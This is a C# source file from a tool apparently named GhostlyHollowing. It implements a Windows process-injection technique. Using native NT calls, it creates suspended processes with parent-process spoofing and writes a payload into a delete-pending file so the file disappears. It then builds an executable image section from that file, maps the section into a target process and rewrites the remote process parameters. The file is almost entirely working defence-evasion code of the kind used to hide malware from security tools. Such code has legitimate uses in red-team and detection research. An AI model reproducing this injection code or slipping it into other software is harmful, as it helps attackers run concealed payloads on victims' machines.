using System;
using System.Runtime.InteropServices;
using GhostlyHollowing.Interop;

namespace GhostlyHollowing.Library
{
    using NTSTATUS = Int32;
    using SIZE_T = UIntPtr;

    internal class Utilities
    {
        public static bool CreateInitialProcess(
            string commandLine,
            int ppid,
            bool isBlocking,
            string windowTitle,
            out IntPtr hProcess,
            out IntPtr hThread)
        {
            NTSTATUS ntstatus;
            bool status;
            IntPtr hParent;
            IntPtr pLocalEnvironment;
            OBJECT_ATTRIBUTES objectAttributes;
            CLIENT_ID clientId;
            PS_CREATE_INFO createInfo;
            PS_ATTRIBUTE_LIST attributeList;
            int nAttributeCount;
            int attributeIndex;
            string imagePathName;
            string ntImagePathName;
            UNICODE_STRING unicodeImagePathName;
            UNICODE_STRING currentDirectory;
            IntPtr pPolicyBuffer = IntPtr.Zero;
            var desktopInfo = new UNICODE_STRING(@"WinSta0\Default");
            var unicodeCommandLine = new UNICODE_STRING(commandLine);
            var unicodeWindowTitle = new UNICODE_STRING(windowTitle);
            hProcess = IntPtr.Zero;
            hThread = IntPtr.Zero;

            imagePathName = Helpers.ResolveImagePathName(commandLine);

            if (string.IsNullOrEmpty(imagePathName))
            {
                Console.WriteLine("[-] Failed to resolve image path name from command line.");

                return false;
            }
            else
            {
                ntImagePathName = string.Format(@"\??\{0}", imagePathName);
                unicodeImagePathName = new UNICODE_STRING(ntImagePathName);
                currentDirectory = new UNICODE_STRING(Environment.CurrentDirectory);
            }

            pLocalEnvironment = Helpers.GetCurrentEnvironmentAddress();

            if (pLocalEnvironment == IntPtr.Zero)
            {
                Console.WriteLine("[-] Failed to get environment pointer.");

                return false;
            }

            ntstatus = NativeMethods.RtlCreateProcessParametersEx(
                    out IntPtr pProcessParameters,
                    in unicodeImagePathName,
                    IntPtr.Zero,
                    in currentDirectory,
                    in unicodeCommandLine,
                    pLocalEnvironment,
                    in unicodeWindowTitle,
                    in desktopInfo,
                    IntPtr.Zero,
                    IntPtr.Zero,
                    RTL_USER_PROC_FLAGS.PARAMS_NORMALIZED);

            if (ntstatus != Win32Consts.STATUS_SUCCESS)
            {
                Console.WriteLine("[-] Failed to create process parameters.");

                return false;
            }

            if (ppid > 0)
            {
                objectAttributes = new OBJECT_ATTRIBUTES();
                clientId = new CLIENT_ID { UniqueProcess = new IntPtr(ppid) };

                ntstatus = NativeMethods.NtOpenProcess(
                    out hParent,
                    ACCESS_MASK.PROCESS_CREATE_PROCESS,
                    in objectAttributes,
                    in clientId);

                if (ntstatus != Win32Consts.STATUS_SUCCESS)
                {
                    Console.WriteLine("[!] Failed to open parent process.");
                    Console.WriteLine("    |-> {0}", Helpers.GetWin32ErrorMessage(ntstatus, true));
                    hParent = new IntPtr(-1);
                }
            }
            else
            {
                hParent = new IntPtr(-1);
            }

            createInfo = new PS_CREATE_INFO
            {
                Size = new SIZE_T((uint)Marshal.SizeOf(typeof(PS_CREATE_INFO))),
                State = PS_CREATE_STATE.PsCreateInitialState
            };

            if ((hParent != new IntPtr(-1)) && isBlocking)
                nAttributeCount = 3;
            else if (hParent != new IntPtr(-1))
                nAttributeCount = 2;
            else if (isBlocking)
                nAttributeCount = 2;
            else
                nAttributeCount = 1;

            attributeList = new PS_ATTRIBUTE_LIST(nAttributeCount);
            attributeIndex = 0;
            attributeList.Attributes[attributeIndex].Attribute = new UIntPtr((uint)PS_ATTRIBUTES.IMAGE_NAME);
            attributeList.Attributes[attributeIndex].Size = new SIZE_T((uint)unicodeImagePathName.Length);
            attributeList.Attributes[attributeIndex].Value = unicodeImagePathName.GetBuffer();

            if (hParent != new IntPtr(-1))
            {
                attributeIndex++;
                attributeList.Attributes[attributeIndex].Attribute = new UIntPtr((uint)PS_ATTRIBUTES.PARENT_PROCESS);
                attributeList.Attributes[attributeIndex].Size = new SIZE_T((uint)IntPtr.Size);
                attributeList.Attributes[attributeIndex].Value = hParent;
            }

            if (isBlocking)
            {
                pPolicyBuffer = Marshal.AllocHGlobal(Marshal.SizeOf(typeof(ulong)));
                Marshal.WriteInt64(pPolicyBuffer, (long)PROCESS_CREATION_MITIGATION_POLICY.BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON);

                attributeIndex++;
                attributeList.Attributes[attributeIndex].Attribute = new UIntPtr((uint)PS_ATTRIBUTES.MITIGATION_OPTIONS);
                attributeList.Attributes[attributeIndex].Size = new SIZE_T((uint)Marshal.SizeOf(typeof(ulong)));
                attributeList.Attributes[attributeIndex].Value = pPolicyBuffer;
            }

            ntstatus = NativeMethods.NtCreateUserProcess(
                out hProcess,
                out hThread,
                ACCESS_MASK.MAXIMUM_ALLOWED,
                ACCESS_MASK.MAXIMUM_ALLOWED,
                IntPtr.Zero,
                IntPtr.Zero,
                PROCESS_CREATION_FLAGS.SUSPENDED,
                THREAD_CREATION_FLAGS.CREATE_SUSPENDED,
                pProcessParameters,
                ref createInfo,
                ref attributeList);
            NativeMethods.RtlDestroyProcessParameters(pProcessParameters);
            status = (ntstatus == Win32Consts.STATUS_SUCCESS);

            if (pPolicyBuffer != IntPtr.Zero)
                Marshal.FreeHGlobal(pPolicyBuffer);

            if (hParent != new IntPtr(-1))
                NativeMethods.NtClose(hParent);

            if (!status)
            {
                hProcess = IntPtr.Zero;
                hThread = IntPtr.Zero;
                Console.WriteLine("[-] Failed to create suspended process.");
                Console.WriteLine("    |-> {0}", Helpers.GetWin32ErrorMessage(ntstatus, true));
            }

            return status;
        }


        public static IntPtr CreateSuspendedProcess(string imagePathName, int ppid)
        {
            NTSTATUS ntstatus;
            CLIENT_ID clientId;
            IntPtr hImageFile;
            string ntFilePath = string.Format(@"\??\{0}", imagePathName);
            IntPtr hSection = Win32Consts.INVALID_HANDLE_VALUE;
            IntPtr hParent = new IntPtr(-1);
            IntPtr hSuspendedProcess = IntPtr.Zero;
            IntPtr pIoStatusBlock = Marshal.AllocHGlobal(Marshal.SizeOf(typeof(IO_STATUS_BLOCK)));
            var objectAttributes = new OBJECT_ATTRIBUTES(
                ntFilePath,
                OBJECT_ATTRIBUTES_FLAGS.CaseInsensitive);

            do
            {
                ntstatus = NativeMethods.NtOpenFile(
                    out hImageFile,
                    ACCESS_MASK.FILE_READ_DATA | ACCESS_MASK.FILE_EXECUTE | ACCESS_MASK.FILE_READ_ATTRIBUTES | ACCESS_MASK.SYNCHRONIZE,
                    in objectAttributes,
                    pIoStatusBlock,
                    FILE_SHARE_ACCESS.READ | FILE_SHARE_ACCESS.DELETE,
                    FILE_OPEN_OPTIONS.SYNCHRONOUS_IO_NONALERT | FILE_OPEN_OPTIONS.NON_DIRECTORY_FILE);
                    Marshal.FreeHGlobal(pIoStatusBlock);

                if (ntstatus != Win32Consts.STATUS_SUCCESS)
                {
                    hImageFile = Win32Consts.INVALID_HANDLE_VALUE;
                    Console.WriteLine("[-] Failed to open \"{0}\".", ntFilePath);
                    Console.WriteLine("    |-> {0}", Helpers.GetWin32ErrorMessage(ntstatus, true));
                    break;
                }

                ntstatus = NativeMethods.NtCreateSection(
                    out hSection,
                    ACCESS_MASK.SECTION_ALL_ACCESS,
                    IntPtr.Zero,
                    IntPtr.Zero,
                    SECTION_PROTECTIONS.PAGE_READONLY,
                    SECTION_ATTRIBUTES.SEC_IMAGE,
                    hImageFile);

                if (ntstatus != Win32Consts.STATUS_SUCCESS)
                {
                    Console.WriteLine("[-] Failed to create section.");
                    Console.WriteLine("    |-> {0}", Helpers.GetWin32ErrorMessage(ntstatus, true));
                    break;
                }

                if (ppid > 0)
                {
                    objectAttributes = new OBJECT_ATTRIBUTES();
                    clientId = new CLIENT_ID { UniqueProcess = new IntPtr(ppid) };

                    ntstatus = NativeMethods.NtOpenProcess(
                        out hParent,
                        ACCESS_MASK.PROCESS_CREATE_PROCESS,
                        in objectAttributes,
                        in clientId);

                    if (ntstatus != Win32Consts.STATUS_SUCCESS)
                    {
                        hParent = new IntPtr(-1);
                        Console.WriteLine("[!] Failed to open parent process.");
                        Console.WriteLine("    |-> {0}", Helpers.GetWin32ErrorMessage(ntstatus, true));
                    }
                }
                else
                {
                    hParent = new IntPtr(-1);
                }

                ntstatus = NativeMethods.NtCreateProcessEx(
                    out hSuspendedProcess,
                    ACCESS_MASK.PROCESS_ALL_ACCESS,
                    IntPtr.Zero,
                    hParent,
                    NT_PROCESS_CREATION_FLAGS.INHERIT_HANDLES,
                    hSection,
                    IntPtr.Zero,
                    IntPtr.Zero,
                    BOOLEAN.FALSE);

                if (ntstatus != Win32Consts.STATUS_SUCCESS)
                {
                    hSuspendedProcess = IntPtr.Zero;
                    Console.WriteLine("[-] Failed to create suspended process.");
                    Console.WriteLine("    |-> {0}", Helpers.GetWin32ErrorMessage(ntstatus, true));
                }
            } while (false);

            Marshal.FreeHGlobal(pIoStatusBlock);

            if (hParent != new IntPtr(-1))
                NativeMethods.NtClose(hParent);

            if (hSection != Win32Consts.INVALID_HANDLE_VALUE)
                NativeMethods.NtClose(hSection);

            if (hImageFile != Win32Consts.INVALID_HANDLE_VALUE)
                NativeMethods.NtClose(hImageFile);

            return hSuspendedProcess;
        }


        public static IntPtr CreateDeletePendingFileSection(
            string tmpFilePath,
            byte[] payload)
        {
            NTSTATUS ntstatus;
            IntPtr hDeletePendingFile;
            IntPtr pIoStatusBlock;
            int nSizeIoStatusBlock = Marshal.SizeOf(typeof(IO_STATUS_BLOCK));

            hDeletePendingFile = OpenDeletePendingFile(tmpFilePath);

            if (hDeletePendingFile == Win32Consts.INVALID_HANDLE_VALUE)
                return Win32Consts.INVALID_HANDLE_VALUE;

            pIoStatusBlock = Marshal.AllocHGlobal(nSizeIoStatusBlock);
            var fileDispositionInfo = new FILE_DISPOSITION_INFORMATION(true);

            ntstatus = NativeMethods.NtSetInformationFile(
                hDeletePendingFile,
                pIoStatusBlock,
                in fileDispositionInfo,
                (uint)Marshal.SizeOf(typeof(FILE_DISPOSITION_INFORMATION)),
                FILE_INFORMATION_CLASS.FileDispositionInformation);

            if (ntstatus != Win32Consts.STATUS_SUCCESS)
            {
                Console.WriteLine("[-] Failed to set information to file.");
                Console.WriteLine("    |-> {0}", Helpers.GetWin32ErrorMessage(ntstatus, true));
                Marshal.FreeHGlobal(pIoStatusBlock);
                NativeMethods.NtClose(hDeletePendingFile);

                return Win32Consts.INVALID_HANDLE_VALUE;
            }

            ntstatus = NativeMethods.NtWriteFile(
                hDeletePendingFile,
                IntPtr.Zero,
                IntPtr.Zero,
                IntPtr.Zero,
                pIoStatusBlock,
                payload,
                (uint)payload.Length,
                IntPtr.Zero,
                IntPtr.Zero);
            Marshal.FreeHGlobal(pIoStatusBlock);

            if (ntstatus != Win32Consts.STATUS_SUCCESS)
            {
                Console.WriteLine("[-] Failed to write image data to file.");
                Console.WriteLine("    |-> {0}", Helpers.GetWin32ErrorMessage(ntstatus, true));
                NativeMethods.NtClose(hDeletePendingFile);

                return Win32Consts.INVALID_HANDLE_VALUE;
            }

            ntstatus = NativeMethods.NtCreateSection(
                out IntPtr hSection,
                ACCESS_MASK.SECTION_ALL_ACCESS,
                IntPtr.Zero,
                IntPtr.Zero,
                SECTION_PROTECTIONS.PAGE_READONLY,
                SECTION_ATTRIBUTES.SEC_IMAGE,
                hDeletePendingFile);
            NativeMethods.NtClose(hDeletePendingFile);

            if (ntstatus != Win32Consts.STATUS_SUCCESS)
            {
                Console.WriteLine("[-] Failed to create section in delete pending file.");
                Console.WriteLine("    |-> {0}", Helpers.GetWin32ErrorMessage(ntstatus, true));

                return Win32Consts.INVALID_HANDLE_VALUE;
            }

            return hSection;
        }


        public static IntPtr MapSectionToProcess(
            IntPtr hProcess,
            IntPtr hSection)
        {
            NTSTATUS ntstatus;
            var pSectionBaseAddress = IntPtr.Zero;
            var ViewSize = SIZE_T.Zero;

            ntstatus = NativeMethods.NtMapViewOfSection(
                hSection,
                hProcess,
                ref pSectionBaseAddress,
                UIntPtr.Zero,
                SIZE_T.Zero,
                IntPtr.Zero,
                ref ViewSize,
                SECTION_INHERIT.ViewShare,
                0,
                MEMORY_PROTECTION.READONLY);

            if ((ntstatus != Win32Consts.STATUS_SUCCESS) &&
                (ntstatus != Win32Consts.STATUS_IMAGE_NOT_AT_BASE))
            {
                Console.WriteLine("[-] Failed to map section to target process.");
                Console.WriteLine("    |-> {0}", Helpers.GetWin32ErrorMessage(ntstatus, true));

                return IntPtr.Zero;
            }
            else if (ntstatus == Win32Consts.STATUS_IMAGE_NOT_AT_BASE)
            {
                Console.WriteLine("[!] Image section is relocated.");
            }

            return pSectionBaseAddress;
        }


        public static IntPtr OpenDeletePendingFile(string filePath)
        {
            NTSTATUS ntstatus;
            string ntFilePath = string.Format(@"\??\{0}", filePath);
            var objectAttributes = new OBJECT_ATTRIBUTES(
                ntFilePath,
                OBJECT_ATTRIBUTES_FLAGS.CaseInsensitive);
            IntPtr pIoStatusBlock = Marshal.AllocHGlobal(
                Marshal.SizeOf(typeof(IO_STATUS_BLOCK)));

            ntstatus = NativeMethods.NtOpenFile(
                out IntPtr hFile,
                ACCESS_MASK.DELETE | ACCESS_MASK.SYNCHRONIZE | ACCESS_MASK.GENERIC_READ | ACCESS_MASK.GENERIC_WRITE,
                in objectAttributes,
                pIoStatusBlock,
                FILE_SHARE_ACCESS.READ | FILE_SHARE_ACCESS.WRITE,
                FILE_OPEN_OPTIONS.SYNCHRONOUS_IO_NONALERT | FILE_OPEN_OPTIONS.SUPERSEDE);
            Marshal.FreeHGlobal(pIoStatusBlock);

            if (ntstatus != Win32Consts.STATUS_SUCCESS)
            {
                Console.WriteLine("[-] Failed to open \"{0}\".", ntFilePath);
                Console.WriteLine("    |-> {0}", Helpers.GetWin32ErrorMessage(ntstatus, true));

                return Win32Consts.INVALID_HANDLE_VALUE;
            }

            return hFile;
        }


        public static void RebaseProcessParameters(
            IntPtr pLocalProcessParameters,
            IntPtr pRemoteProcessParameters,
            bool toLocalPointers,
            bool containsEnvironment)
        {
            ulong nBaseOffset;
            IntPtr pBasePointer;
            IntPtr pTempPointer;
            IntPtr pVerify;
            IntPtr pOverwrite;
            var processParameters = (RTL_USER_PROCESS_PARAMETERS)Marshal.PtrToStructure(
                pLocalProcessParameters,
                typeof(RTL_USER_PROCESS_PARAMETERS));
            ulong nSizeStructure = (ulong)processParameters.MaximumLength;
            ulong nDataSize = nSizeStructure;

            if (containsEnvironment)
                nDataSize += processParameters.EnvironmentSize;

            if (toLocalPointers)
            {
                pBasePointer = pRemoteProcessParameters;
                nBaseOffset = (ulong)(pLocalProcessParameters.ToInt64() - pRemoteProcessParameters.ToInt64());
            }
            else
            {
                pBasePointer = pLocalProcessParameters;
                nBaseOffset = (ulong)(pRemoteProcessParameters.ToInt64() - pLocalProcessParameters.ToInt64());
            }

            for (int nPosition = 0; nPosition < (int)nSizeStructure; nPosition += IntPtr.Size)
            {
                pTempPointer = new IntPtr(pLocalProcessParameters.ToInt64() + nPosition);
                pVerify = Marshal.ReadIntPtr(pTempPointer);

                if ((ulong)(pVerify.ToInt64() - pBasePointer.ToInt64()) < nDataSize)
                {
                    pOverwrite = new IntPtr(pVerify.ToInt64() + (long)nBaseOffset);
                    Marshal.WriteIntPtr(pTempPointer, pOverwrite);
                }
            }
        }


        public static IntPtr SetProcessParameters(
            IntPtr hProcess,
            string imagePathName,
            string commandLine,
            string currentDirectory,
            string windowTitle)
        {
            NTSTATUS ntstatus;
            bool status;
            IntPtr pPeb;
            IntPtr pLocalEnvironment;
            IntPtr pRemoteProcessParametersPointer;
            IntPtr pRemoteProcessParameters;
            IntPtr pDataBuffer;
            int nSizeParameters;
            int nSizeEnvironment;
            int nSizeBuffer;
            int nOffsetProcessParameters;
            int nOffsetEnvironmentSize;
            int nPageOffset;
            string winDir = Environment.GetEnvironmentVariable("windir");
            var unicodeImagePathName = new UNICODE_STRING(imagePathName);
            var unicodeCommandline = new UNICODE_STRING(commandLine);
            var unicodeCurrentDirectory = new UNICODE_STRING(currentDirectory);
            var unicodeWindowTitle = new UNICODE_STRING(windowTitle);
            var dllPath = new UNICODE_STRING(string.Format(@"{0}\System32", winDir));
            var desktopInfo = new UNICODE_STRING(@"WinSta0\Default");

            pPeb = Helpers.GetPebAddress(hProcess);

            if (pPeb == IntPtr.Zero)
                return IntPtr.Zero;

            nOffsetEnvironmentSize = Marshal.OffsetOf(
                    typeof(RTL_USER_PROCESS_PARAMETERS),
                    "EnvironmentSize").ToInt32();

            if (IntPtr.Size == 4)
            {
                nOffsetProcessParameters = Marshal.OffsetOf(
                    typeof(PEB32_PARTIAL),
                    "ProcessParameters").ToInt32();
                pRemoteProcessParametersPointer = new IntPtr(
                    pPeb.ToInt32() + nOffsetProcessParameters);
            }
            else
            {
                nOffsetProcessParameters = Marshal.OffsetOf(
                    typeof(PEB64_PARTIAL),
                    "ProcessParameters").ToInt32();
                pRemoteProcessParametersPointer = new IntPtr(
                    pPeb.ToInt64() + nOffsetProcessParameters);
            }

            pLocalEnvironment = Helpers.GetCurrentEnvironmentAddress();

            if (pLocalEnvironment == IntPtr.Zero)
                return IntPtr.Zero;

            ntstatus = NativeMethods.RtlCreateProcessParametersEx(
                    out IntPtr pLocalProcessParameters,
                    in unicodeImagePathName,
                    in dllPath,
                    in unicodeCurrentDirectory,
                    in unicodeCommandline,
                    pLocalEnvironment,
                    in unicodeWindowTitle,
                    in desktopInfo,
                    IntPtr.Zero,
                    IntPtr.Zero,
                    RTL_USER_PROC_FLAGS.PARAMS_NORMALIZED);

            if (ntstatus != Win32Consts.STATUS_SUCCESS)
                return IntPtr.Zero;

            nPageOffset = (int)(pLocalProcessParameters.ToInt64() - (pLocalProcessParameters.ToInt64() & ~(0xFFF)));
            nSizeParameters = Marshal.ReadInt32(pLocalProcessParameters); // MaxLength
            nSizeEnvironment = (int)Marshal.ReadInt64(new IntPtr(
                pLocalProcessParameters.ToInt64() +
                nOffsetEnvironmentSize));
            nSizeBuffer = nSizeParameters + nSizeEnvironment;

            pRemoteProcessParameters = Helpers.AllocateReadWriteMemory(
                hProcess,
                IntPtr.Zero,
                (uint)(nSizeBuffer + 0x1000));

            if (pRemoteProcessParameters == IntPtr.Zero)
            {
                Console.WriteLine("[-] Failed to allocate memory.");

                return IntPtr.Zero;
            }

            pRemoteProcessParameters = new IntPtr(pRemoteProcessParameters.ToInt64() + nPageOffset);

            RebaseProcessParameters(
                pLocalProcessParameters,
                pRemoteProcessParameters,
                false,
                true);

            status = Helpers.WriteMemory(
                hProcess,
                pRemoteProcessParameters,
                pLocalProcessParameters,
                (uint)nSizeBuffer);
            NativeMethods.RtlDestroyProcessParameters(pLocalProcessParameters);

            if (!status)
            {
                Console.WriteLine("[-] Failed to write process parameters.");

                return IntPtr.Zero;
            }

            pDataBuffer = Marshal.AllocHGlobal(IntPtr.Size);
            Marshal.WriteIntPtr(pDataBuffer, pRemoteProcessParameters);

            status = Helpers.WriteMemory(
                hProcess,
                pRemoteProcessParametersPointer,
                pDataBuffer,
                (uint)IntPtr.Size);

            Marshal.FreeHGlobal(pDataBuffer);

            if (!status)
                return IntPtr.Zero;

            return pRemoteProcessParameters;
        }
    }
}
